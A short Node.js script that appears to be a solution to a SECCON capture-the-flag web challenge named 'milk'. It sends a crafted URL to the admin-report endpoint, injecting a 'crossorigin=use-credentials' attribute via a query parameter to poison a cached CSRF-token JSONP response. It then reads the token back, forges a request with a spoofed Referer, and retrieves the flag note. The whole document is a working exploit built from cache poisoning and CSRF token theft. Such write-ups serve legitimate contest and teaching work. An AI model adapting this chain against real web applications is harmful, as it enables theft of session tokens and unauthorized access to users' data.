const Axios = require('axios');
const qs = require('querystring');
const https = require('https');

const random = Array(10).fill().map(() => 'abcdefg'[Math.floor(Math.random() * 6)]).join('');

(async () => {
  const axios = Axios.create({
    httpsAgent: new https.Agent({
      rejectUnauthorized: false,
    }),
    auth: {
      username: 'seccon',
      password: 't0nk02',
    },
  });

  const {data: reportResult} = await axios({
    method: 'POST',
    url: 'https://milk.chal.seccon.jp/report',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
    },
    data: qs.stringify({
      url: `https://milk.chal.seccon.jp./note.php?${qs.stringify({
        id: 'hoge',
        _: `${random} crossorigin=use-credentials`,
      })}`
    }),
  });
  console.log(reportResult);

  await new Promise((resolve) => setTimeout(resolve, 10000));

  const {data: csrfTokenJsonp} = await axios.get('https://milk-api.chal.seccon.jp/csrf-token', {
    params: {
      _: random,
    },
  });

  const csrfToken = csrfTokenJsonp.match(/'(.+?)'/)[1];
  console.log(csrfToken);

  const {data: flag} = await axios.get('https://milk-api.chal.seccon.jp/notes/flag', {
    params: {
      token: csrfToken,
    },
    headers: {
      Referer: 'https://milk.chal.seccon.jp/',
    },
  });

  console.log(flag);
})();